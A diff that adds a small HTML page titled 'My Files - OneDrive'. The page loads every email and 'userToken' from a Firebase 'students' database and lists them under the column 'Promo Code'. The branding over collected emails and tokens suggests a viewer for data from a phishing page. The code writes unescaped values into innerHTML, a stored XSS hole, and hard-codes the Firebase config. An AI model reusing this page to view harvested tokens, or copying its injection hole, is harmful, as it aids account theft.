@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>My Files - OneDrive</title>
+    <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
+    
+    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
+    <style type="text/css">
+      #customers {
+  font-family: Arial, Helvetica, sans-serif;
+  border-collapse: collapse;
+  width: 100%;
+}
+
+#customers td, #customers th {
+  border: 1px solid #ddd;
+  padding: 8px;
+}
+
+#customers tr:nth-child(even){background-color: #f2f2f2;}
+
+#customers tr:hover {background-color: #ddd;}
+
+#customers th {
+  padding-top: 12px;
+  padding-bottom: 12px;
+  text-align: left;
+  background-color: #04AA6D;
+  color: white;
+}
+    </style>
+  </head>
+  <body class="skin-blue">
+
+    <div class="wrapper">
+      
+     
+      
+        <!-- Content Header (Page header) -->
+         <!-- Main content -->
+        <!-- <section class="content">
+          <ul id="list">
+
+          </ul>
+        </section> -->
+        <table id="customers">
+          <thead>
+            <th>sNO</th>
+            <th>User</th>
+            <th>Promo Code</th>
+          </thead>
+          <tbody id='tbody'>
+
+          </tbody>
+        </table>
+      </div>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.3.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.3.1/firebase-database.js"></script>
+    <script>
+      // Your web app's Firebase configuration
+      var firebaseConfig = {
+		 apiKey: "AIzaSyDLGiDkJHh4jNW9NEi8X8ch0NYlMx7OHr4",
+		 authDomain: "maimaimall.firebaseapp.com",
+		 projectId: "maimaimall",
+		 storageBucket: "maimaimall.appspot.com",
+		 messagingSenderId: "354371636626",
+		 appId: "1:354371636626:web:82a0002cc096a2a03d054b"
+	  };
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+
+      // Set database variable
+      //var database = firebase.database()
+
+      var stdNo = 0;
+      function showItemOnList(email,userToken){
+        var tbody=document.getElementById('tbody');
+        var trow=document.createElement('tr');
+        var header=document.createElement('td');
+        var _email=document.createElement('td');
+        var _userToken=document.createElement('td');
+
+        header.innerHTML= ++stdNo;
+        _email.innerHTML=email;
+        _userToken.innerHTML=userToken;
+
+        trow.appendChild(header);
+        trow.appendChild(_email);
+        trow.appendChild(_userToken);
+        tbody.appendChild(trow);
+
+      }
+      function FetchAllData(){
+        firebase.database().ref('students').once('value',function(snapshot){
+          snapshot.forEach(
+            function(ChildSnapshot){
+              let email = ChildSnapshot.val().email;
+              let userToken = ChildSnapshot.val().userToken;
+              showItemOnList(email,userToken)
+            }
+          );
+        });  
+
+      }
+      window.onload = FetchAllData();
+    </script>
+      </body>
+</html>
